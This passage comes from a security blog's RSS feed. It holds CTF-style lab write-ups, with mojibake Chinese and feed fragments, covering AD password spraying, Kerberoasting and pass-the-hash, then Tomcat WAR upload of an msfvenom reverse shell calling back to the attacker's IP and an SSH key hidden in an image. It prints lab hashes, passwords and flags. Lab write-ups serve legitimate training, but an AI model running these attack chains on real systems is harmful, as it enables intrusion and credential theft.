# Âõõ„ÄÅÂüü‰ø°ÊÅØÊûö‰∏æ

## 4.1 ‰ΩøÁî®enum4linux-ngÊûö‰∏æÂüü‰ø°ÊÅØ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ enum4linux-ng -A 192.168.205.131
...
[+] Long domain name is: SOUPEDECODE.LOCAL
[+] Got domain/workgroup name: SOUPEDECODE
...
NetBIOS computer name: DC01
NetBIOS domain name: SOUPEDECODE
DNS domain: SOUPEDECODE.LOCAL
FQDN: DC01.SOUPEDECODE.LOCAL
...
[+] Server allows authentication via username 'iutprjyw' and password ''
[H] Rerunning enumeration with user 'iutprjyw' might give more results
...
```

Ëé∑ÂèñÂà∞Âüü‰ø°ÊÅØÔºö

- ÂüüÂêçÔºö`SOUPEDECODE.LOCAL`
- ÂüüÊéßÂà∂Âô®Ôºö`DC01.SOUPEDECODE.LOCAL`

## 4.2 Ê∑ªÂä†ÂüüÂêçËß£Êûê

Â∞ÜÂüüÂêçÊ∑ªÂä†Âà∞ `/etc/hosts` Êñá‰ª∂Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo nano /etc/hosts

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ tail -n 1 /etc/hosts
192.168.205.131 SOUPEDECODE.LOCAL
```

# ‰∫î„ÄÅÁî®Êà∑Êûö‰∏æ‰∏éÂØÜÁ†ÅÁàÜÁ†¥

## 5.1 SIDÊûö‰∏æËé∑ÂèñÁî®Êà∑ÂàóË°®

‰ΩøÁî® `lookupsid.py` Êûö‰∏æÂüüÁî®Êà∑Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.131
...
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
...
```

ÊèêÂèñÁî®Êà∑ÂêçÂàóË°®Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.131 2&gt;/dev/null | grep '(SidTypeUser)' | cut -d '\' -f2 | cut -d ' ' -f1 &gt; user
```

## 5.2 ÂØÜÁ†ÅÂñ∑Ê¥íÊîªÂáª

‰ΩøÁî® `crackmapexec` ËøõË°åÂØÜÁ†ÅÂñ∑Ê¥íÔºàÁî®Êà∑Âêç‰Ωú‰∏∫ÂØÜÁ†ÅÔºâÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ crackmapexec smb 192.168.205.131 -u user -p user --continue-on-success --no-bruteforce | grep '+'
SMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

ÊàêÂäüÊâæÂà∞Âº±ÂØÜÁ†ÅÁî®Êà∑Ôºö`ybob317:ybob317`

# ÂÖ≠„ÄÅKerberoastingÊîªÂáª

## 6.1 Ëé∑ÂèñÊúçÂä°Á•®ÊçÆ

‰ΩøÁî®Ëé∑ÂæóÁöÑÂá≠ÊçÆËøõË°åKerberoastingÊîªÂáªÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.205.131 -request
...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$S...
```

ÊàêÂäüËé∑ÂèñÂà∞ÊúçÂä°Ë¥¶Êà∑ÁöÑKerberosÁ•®ÊçÆ„ÄÇ

## 6.2 Á†¥Ëß£ÊúçÂä°Ë¥¶Êà∑ÂØÜÁ†Å

‰ΩøÁî® `john` Á†¥Ëß£KerberosÁ•®ÊçÆÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
Password123!!    (?)   
1g 0:00:00:09 DONE (2025-08-30 18:22) 0.1054g/s 1513Kp/s 7184Kc/s 7184KC/s
```

Á†¥Ëß£Âá∫ÂØÜÁ†ÅÔºö`Password123!!`

## 6.3 ÂØÜÁ†ÅÂñ∑Ê¥íÈ™åËØÅ

‰ΩøÁî®Á†¥Ëß£Âá∫ÁöÑÂØÜÁ†ÅËøõË°åÂØÜÁ†ÅÂñ∑Ê¥íÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ crackmapexec smb 192.168.205.131 -u user -p 'Password123!!' --continue-on-success| grep '+' 
SMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
```

Á°ÆËÆ§ `file_svc` Ë¥¶Êà∑ÂØÜÁ†Å‰∏∫ `Password123!!`

# ‰∏É„ÄÅÊùÉÈôêÊèêÂçá

## 7.1 ËÆøÈóÆbackupÂÖ±‰∫´

‰ΩøÁî® `file_svc` Ë¥¶Êà∑ËÆøÈóÆ‰πãÂâçÊó†Ê≥ïËÆøÈóÆÁöÑ `backup` ÂÖ±‰∫´Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nxc smb 192.168.205.131 -u 'file_svc' -p 'Password123!!' --shares --no-bruteforce
...
SMB         192.168.205.131 445    DC01    backup          READ          
...
```

## 7.2 Ëé∑ÂèñÂ§á‰ªΩÊñá‰ª∂

ËøûÊé•Âà∞backupÂÖ±‰∫´Âπ∂‰∏ãËΩΩÊñá‰ª∂Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ smbclient //192.168.205.131/backup -U file_svc
Password for [WORKGROUP\file_svc]:
smb: \&gt; DIR
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Mon Jun 17 13:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024
smb: \&gt; get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (43.6 KiloBytes/sec)
```

## 7.3 ÂàÜÊûêÂ§á‰ªΩÊñá‰ª∂

Êü•ÁúãÂ§á‰ªΩÊñá‰ª∂ÂÜÖÂÆπÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

ÂèëÁé∞‰∫ÜÂ§ö‰∏™ËÆ°ÁÆóÊú∫Ë¥¶Êà∑ÁöÑNTLMÂìàÂ∏åÂÄºÔºÅ

## 7.4 ÂìàÂ∏å‰º†ÈÄíÊîªÂáª

ÊèêÂèñÁî®Êà∑ÂêçÂíåÂìàÂ∏åÂÄºÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ awk -F '[:]' '{print $1}' backup_extract.txt &gt; user

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ awk -F '[:]' '{print $4}' backup_extract.txt &gt; pass
```

‰ΩøÁî®ÂìàÂ∏åËøõË°åËÆ§ËØÅÊµãËØïÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ crackmapexec smb 192.168.205.131 -u user -H pass --continue-on-success| grep '+'      
SMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

`FileServer$` Ë¥¶Êà∑ÂÖ∑ÊúâÁÆ°ÁêÜÂëòÊùÉÈôêÔºÅ

# ÂÖ´„ÄÅËé∑ÂèñÁ≥ªÁªüËÆøÈóÆÊùÉÈôê

## 8.1 ÈÄöËøáWinRMËé∑ÂèñShell

‰ΩøÁî® `FileServer$` ÁöÑNTLMÂìàÂ∏åÈÄöËøáWinRMËé∑ÂèñÁ≥ªÁªüËÆøÈóÆÊùÉÈôêÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ evil-winrm -i 192.168.205.131 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
                                      
Evil-WinRM shell v3.7
...
*Evil-WinRM* PS C:\Users\FileServer$\Documents&gt; whoami /all

USER INFORMATION
----------------
User Name               SID
======================= ============================================
soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065

GROUP INFORMATION
-----------------
Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
...
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
...
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
...
```

ÊàêÂäüËé∑ÂèñÂà∞ÂÖ∑ÊúâÁÆ°ÁêÜÂëòÊùÉÈôêÁöÑÁ≥ªÁªüËÆøÈóÆÔºÅ

## 8.2 Ëé∑ÂèñFlag

Êü•ÊâæÂπ∂Ëé∑ÂèñÁî®Êà∑ÂíåÁÆ°ÁêÜÂëòFlagÔºö

```bash
*Evil-WinRM* PS C:\Users&gt; dir *.txt -R
...
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/17/2024  10:44 AM             32 root.txt

    Directory: C:\Users\ybob317\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/12/2024   4:54 AM             32 user.txt

*Evil-WinRM* PS C:\Users&gt; type C:\Users\Administrator\Desktop\root.txt
a9564ebc3289b7a14551baf8ad5ec60a

*Evil-WinRM* PS C:\Users&gt; type C:\Users\ybob317\Desktop\user.txt
6bab1f09a7403980bfeb4c2b412be47b
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_DC1.html</guid><pubDate>Sat, 30 Aug 2025 14:25:35 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Cat</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Cat.html</link><description>### **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

È¶ñÂÖàÔºåÊàë‰ª¨ÂØπÁõÆÊ†áÁΩëÊÆµËøõË°å‰∏ªÊú∫ÂèëÁé∞Ôºå‰ª•Á°ÆÂÆöÁõÆÊ†áÊú∫Âô®ÁöÑIPÂú∞ÂùÄ„ÄÇ

## 1. ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî®`arp-scan`Â∑•ÂÖ∑Êâ´ÊèèÊú¨Âú∞ÁΩëÁªúÔºåÂØªÊâæÂ≠òÊ¥ª‰∏ªÊú∫„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.149 08:00:27:5a:8c:5a       PCS Systemtechnik GmbH
...
```

‰ªéÊâ´ÊèèÁªìÊûú‰∏≠ÔºåÊàë‰ª¨ËØÜÂà´Âá∫ÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ‰∏∫ `192.168.205.149`„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè

Á°ÆËÆ§ÁõÆÊ†áIPÂêéÔºå‰ΩøÁî®`nmap`ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Êé¢ÊµãÂÖ∂ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 05:40 EDT
Nmap scan report for 192.168.205.149
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:5A:8C:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü‰∏â‰∏™Á´ØÂè£Ôºö

*   **22/tcp**: SSHÊúçÂä°ÔºåÁî®‰∫éËøúÁ®ãÁôªÂΩï„ÄÇ
*   **80/tcp**: HTTPÊúçÂä°Ôºå‰∏Ä‰∏™WebÊúçÂä°Âô®„ÄÇ
*   **8080/tcp**: HTTP-ProxyÊúçÂä°ÔºåÈÄöÂ∏∏‰πüÊòØWebÊúçÂä°ÔºåÂèØËÉΩÊòØTomcatÊàñÁ±ª‰ººÁöÑJavaÂ∫îÁî®ÊúçÂä°Âô®„ÄÇ

# **‰∫å„ÄÅWebÊ∏óÈÄè**

Êàë‰ª¨‰ªéWebÊúçÂä°ÂºÄÂßãËøõË°åÊ∏óÈÄè„ÄÇ

## 1. 80Á´ØÂè£ - ApacheÊúçÂä°

ËÆøÈóÆ `http://192.168.205.149`ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Á∫ØÈùôÊÄÅÁöÑÁå´Âí™Âä®ÁîªÈ°µÈù¢ÔºåÊ≤°ÊúâÂèØ‰∫§‰∫íÁöÑÂäüËÉΩÁÇπ„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨ÂØπÂÖ∂ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåÂ∞ùËØïÂèëÁé∞ÈöêËóèÁöÑË∑ØÂæÑÊàñÊñá‰ª∂„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dirsearch -u http://192.168.205.149
...
[05:41:20] 200 -    0B  - /config.php
[05:41:21] 200 -    0B  - /database.php
[05:41:32] 200 -    0B  - /upload.php
[05:41:32] 301 -  320B  - /uploads  -&gt;  http://192.168.205.149/uploads/
[05:41:32] 200 -  408B  - /uploads/
...
```

ÁõÆÂΩïÁàÜÁ†¥ÂèëÁé∞‰∫Ü‰∏Ä‰∫õÊúâË∂£ÁöÑPHPÊñá‰ª∂ÔºåÂ¶Ç`config.php`„ÄÅ`database.php`Âíå`upload.php`Ôºå‰ΩÜÂÆÉ‰ª¨ÁöÑÂ§ßÂ∞èÈÉΩ‰∏∫0Â≠óËäÇÔºåË°®ÊòéÊòØÁ©∫Êñá‰ª∂„ÄÇ`/uploads/`ÁõÆÂΩïËôΩÁÑ∂Â≠òÂú®Ôºå‰ΩÜÂÖ∂‰∏≠Ê≤°Êúâ‰ªª‰ΩïÂÜÖÂÆπ„ÄÇ80Á´ØÂè£ÁöÑÊ∏óÈÄè‰ºº‰πéÈô∑ÂÖ•ÂÉµÂ±Ä„ÄÇ

## 2. 8080Á´ØÂè£ - TomcatÊúçÂä°

Êé•ÁùÄÔºåÊàë‰ª¨ËÆøÈóÆ `http://192.168.205.149:8080`ÔºåÈ°µÈù¢ÊòæÁ§∫ËøôÊòØ`Tomcat/10.1.20`ÁöÑÁÆ°ÁêÜÁïåÈù¢„ÄÇTomcatÁöÑÁÆ°ÁêÜÂêéÂè∞Â∏∏Â∏∏Â≠òÂú®Âº±Âè£‰ª§ÊºèÊ¥ûÔºåÊàë‰ª¨Â∞ùËØï‰ΩøÁî®Â∏∏ËßÅÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅËøõË°åÁôªÂΩï„ÄÇ

**Âº±Âè£‰ª§Â∞ùËØï:**

*   `admin`
*   `manager`
*   `tomcat`
*   ...

ÊúÄÁªàÔºåÂú®ËÆøÈóÆ `http://192.168.205.149:8080/manager` Êó∂Ôºå‰ΩøÁî® `admin:tomcat` ÊàêÂäüÁôªÂΩïÂà∞Tomcat WebÂ∫îÁî®Á®ãÂ∫èÁÆ°ÁêÜÂô®„ÄÇ

## 3. Ëé∑ÂèñWebShell

ÊàêÂäüÁôªÂΩïÂêéÂè∞ÂêéÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÈÉ®ÁΩ≤WARÊñá‰ª∂Êù•Ëé∑ÂèñÊúçÂä°Âô®ÁöÑÊéßÂà∂ÊùÉ„ÄÇ

È¶ñÂÖàÔºå‰ΩøÁî®`msfvenom`ÁîüÊàê‰∏Ä‰∏™JavaÁöÑÂèçÂêëshell payload„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.205.128 LPORT=8888 -f war -o shell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: shell.war
```

Êé•ÁùÄÔºåÂú®TomcatÂêéÂè∞ÁöÑ 'WAR file to deploy' Â§Ñ‰∏ä‰º†Êàë‰ª¨ÁîüÊàêÁöÑ`shell.war`Êñá‰ª∂Âπ∂ÈÉ®ÁΩ≤„ÄÇ

![image-20250823174407373](http://7r1UMPHK.github.io/image/20250825140722701.webp)

ÂêåÊó∂ÔºåÂú®Kali‰∏ä‰ΩøÁî®`netcat`ÂºÄÂêØÁõëÂê¨„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
```

ÈÉ®ÁΩ≤ÊàêÂäüÂêéÔºåÁÇπÂáªÊñ∞Â∫îÁî®Á®ãÂ∫èÁöÑË∑ØÂæÑÔºà‰æãÂ¶Ç `/shell`ÔºâÊù•Ëß¶Âèëpayload„ÄÇ

```shell
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 43420
id
uid=1001(tomcat) gid=998(tomcat) groups=998(tomcat)
```

ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπshellÔºåÂΩìÂâçÁî®Êà∑‰∏∫`tomcat`„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

‰∏∫‰∫ÜÊñπ‰æøÂêéÁª≠Êìç‰ΩúÔºåÊàë‰ª¨È¶ñÂÖàÂØπËé∑ÂèñÁöÑÈùû‰∫§‰∫íÂºèshellËøõË°åÁ®≥ÂÆöÂåñÂ§ÑÁêÜ„ÄÇ

```shell
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

## 1. tomcat -&gt; catcatcat

Âú®ÁõÆÊ†áÁ≥ªÁªü‰∏≠ËøõË°å‰ø°ÊÅØÊêúÈõÜÔºåÂØªÊâæÂèØÂà©Áî®ÁöÑÊèêÊùÉÁ∫øÁ¥¢„ÄÇÈÄöËøáÊü•ÊâæËøëÊúüË¢´‰øÆÊîπËøáÁöÑÊñá‰ª∂ÔºåÂèëÁé∞‰∫Ü‰∏§‰∏™ÂèØÁñëÁöÑ‰∫åËøõÂà∂Êñá‰ª∂„ÄÇ

```bash
/usr/local/bin/catcatcat      2025-08-02   -rwxr-xr-x        16808
/usr/bin/imgcat               2025-08-02   -rwxr-xr-x       642040
```

`imgcat` ÊòØ‰∏Ä‰∏™Âú®ÁªàÁ´ØÊòæÁ§∫ÂõæÁâáÁöÑÂ∑•ÂÖ∑„ÄÇÊàë‰ª¨ÈáçÁÇπÂÖ≥Ê≥®`catcatcat`Ëøô‰∏™Ëá™ÂÆö‰πâÂëΩ‰ª§„ÄÇ‰ΩøÁî®`strings`ÂëΩ‰ª§Ê£ÄÊü•ËØ•Êñá‰ª∂ÔºåÂèëÁé∞Á°¨ÁºñÁ†ÅÁöÑÂØÜÁ†ÅÂ≠óÁ¨¶‰∏≤„ÄÇ

```shell
tomcat@Cat:/tmp$ strings /usr/local/bin/catcatcat
...
password:this_is_cat_passwd
...
```

Êé•‰∏ãÊù•ÔºåÊü•Áúã`/etc/passwd`Êñá‰ª∂ÔºåÂØªÊâæÂèØËÉΩ‰∏éÊ≠§ÂØÜÁ†ÅÂØπÂ∫îÁöÑÁî®Êà∑„ÄÇ

```shell
tomcat@Cat:/tmp$ cat /etc/passwd|grep bash
root:x:0:0:root:/root:/bin/bash
catcatcat:x:1000:1000:,,,:/home/catcatcat:/bin/bash
dog:x:1002:1001:,,,:/home/dog:/bin/bash
```

ÂèëÁé∞Â≠òÂú®‰∏Ä‰∏™Âêç‰∏∫`catcatcat`ÁöÑÁî®Êà∑„ÄÇ‰ΩøÁî®ËØ•Áî®Êà∑ÂêçÂíåÊâæÂà∞ÁöÑÂØÜÁ†Å`this_is_cat_passwd`ÈÄöËøáSSHËøõË°åÁôªÂΩï„ÄÇÔºàsuÂàáÊç¢‰∏ç‰∫ÜÔºåÂè™ÂèØ‰ª•‰ΩøÁî®sshÔºâ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh catcatcat@192.168.205.149
catcatcat@192.168.205.149's password:
...
catcatcat@Cat:~$ id
uid=1000(catcatcat) gid=1000(catcatcat) groups=1000(catcatcat)
```

ÊàêÂäüÂàáÊç¢Âà∞`catcatcat`Áî®Êà∑„ÄÇ

## 2. catcatcat -&gt; root

ÁôªÂΩïÂêéÔºåÊ£ÄÊü•`catcatcat`Áî®Êà∑ÁöÑ`sudo`ÊùÉÈôê„ÄÇ

```shell
catcatcat@Cat:~$ sudo -l
Matching Defaults entries for catcatcat on Cat:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User catcatcat may run the following commands on Cat:
    (ALL) NOPASSWD: /usr/bin/imgcat
```

ÁªìÊûúË°®ÊòéÔºå`catcatcat`Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°å`/usr/bin/imgcat`ÂëΩ‰ª§„ÄÇËøôÈÄöÂ∏∏ÊòØ‰∏Ä‰∏™ÊèêÊùÉÁöÑÁ™ÅÁ†¥Âè£Ôºå‰ΩÜËøôÈáåÊòØ‰∏Ä‰∏™ÂÖîÂ≠êÊ¥ûÔºàÊúÄËøëSublargeÂæàÂñúÊ¨¢Âá∫ËøôÁßçÂÖîÂ≠êÊ¥ûÂïäÔºâ„ÄÇ

Âú®`catcatcat`Áî®Êà∑ÁöÑ‰∏ªÁõÆÂΩï‰∏ãÔºåÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫`cat.jpg`ÁöÑÂõæÁâáÊñá‰ª∂„ÄÇ

```shell
catcatcat@Cat:~$ ls -al
...
-rw-r--r-- 1 catcatcat catcatcat 4460980 Aug  2 09:50 cat.jpg
-rw-r--r-- 1 catcatcat catcatcat      44 Aug  2 09:18 user.txt
...
```

Êàë‰ª¨Â∞ÜÊ≠§ÂõæÁâáÊñá‰ª∂ÈÄöËøá`scp`‰º†ÂõûKaliËøõË°åÂàÜÊûê„ÄÇ

```shell
catcatcat@Cat:~$ scp cat.jpg kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
...
cat.jpg                                       100% 4356KB  92.5MB/s   00:00
```

‰ΩøÁî®ÈöêÂÜôÊúØÂàÜÊûêÂ∑•ÂÖ∑`stegseek`ÂØπÂõæÁâáËøõË°åÂàÜÊûêÔºåÂ∞ùËØïÊèêÂèñÈöêËóè‰ø°ÊÅØ„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ stegseek cat.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ''
[i] Original filename: 'id_rsa'.
[i] Extracting to 'cat.jpg.out'.
```

`stegseek`ÊàêÂäüÂú®Êó†ÂØÜÁ†ÅÁöÑÊÉÖÂÜµ‰∏ãÊèêÂèñÂá∫‰∫Ü‰∏Ä‰∏™Âêç‰∏∫`id_rsa`ÁöÑÊñá‰ª∂ÔºåËøôÈÄöÂ∏∏ÊòØSSHÁßÅÈí•„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ head -n 1 cat.jpg.out
-----BEGIN OPENSSH PRIVATE KEY-----
```

Á°ÆËÆ§ÊòØÁßÅÈí•Êñá‰ª∂ÂêéÔºåÊàë‰ª¨Áî®ÂÆÉÊù•Â∞ùËØï‰ª•rootË∫´‰ªΩÁôªÂΩïÁõÆÊ†á‰∏ªÊú∫„ÄÇ

È¶ñÂÖàÔºåËµã‰∫àÁßÅÈí•Ê≠£Á°ÆÁöÑÊùÉÈôê„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ mv cat.jpg.out /tmp/id_rsa
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ chmod 600 id_rsa
```

ÁÑ∂ÂêéÔºå‰ΩøÁî®ËØ•ÁßÅÈí•ÈÄöËøáSSHËøûÊé•Âà∞ÁõÆÊ†á„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ ssh root@192.168.205.149 -i /tmp/id_rsa
...
Last login: Sat Aug 23 05:35:10 2025 from 192.168.205.128
root@Cat:~# id
uid=0(root) gid=0(root) groups=0(root)
```

ÊàêÂäüËé∑ÂèñrootÊùÉÈôê„ÄÇ

# **Âõõ„ÄÅÂ§∫ÂèñFlag**

ÊúÄÂêéÔºåÂú®ÂØπÂ∫îÁöÑÁõÆÂΩï‰∏ãËØªÂèñuserÂíårootÁöÑflag„ÄÇ

```shell
root@Cat:~# cat /root/root.txt /home/catcatcat/user.txt
flag{root-471e997ce8c23ad558c2935b88814ab3}
flag{user-081d683d33dde135a273b484ee70123b}
```

Ê∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Cat.html</guid><pubDate>Mon, 25 Aug 2025 06:06:56 +0000</pubDate></item><item><title>hmv_thefinals</title><link>https://7r1UMPHK.github.io/post/hmv_thefinals.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1.1 ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè

È¶ñÂÖàÔºå‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ÁöÑ IP Âú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l                         
...
192.168.205.157 08:00:27:19:f4:ef       PCS Systemtechnik GmbH
...
```

Á°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ IP ‰∏∫ `192.168.205.157`„ÄÇÊé•ÁùÄÔºå‰ΩøÁî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Á°ÆÂÆöÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.157
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:19:F4:EF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) ‰∏§‰∏™Á´ØÂè£„ÄÇ

## 1.2 Web ÊúçÂä°Êé¢Êµã

